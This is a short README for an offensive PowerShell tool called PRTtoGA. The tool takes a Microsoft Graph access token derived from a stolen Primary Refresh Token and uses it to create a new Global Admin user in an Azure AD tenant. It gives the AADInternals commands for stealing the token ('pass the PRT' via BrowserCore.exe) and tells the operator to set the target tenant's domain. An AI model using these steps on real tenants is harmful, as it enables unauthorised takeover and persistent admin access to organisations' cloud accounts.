# PRTtoGA
PRTtoGA is a simple PS1 script for using Microsoft Graph Access Token (Usually not MFA enforced) to create a new user and set the user with Global admin privileges. 

##Usage
Get the appropriate Access Token using AADinternals (PASS THE PRT)
```
#Get the PRT using the BrowserCore.exe technique 
$prtToken = Get-AADIntUserPRTToken

#Get the AccessToken for MSGRAPH
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

```
**Then change the "$accessToken"variable to the received access Token. 
Dont forget to change the example.com to the tenants actual domain! **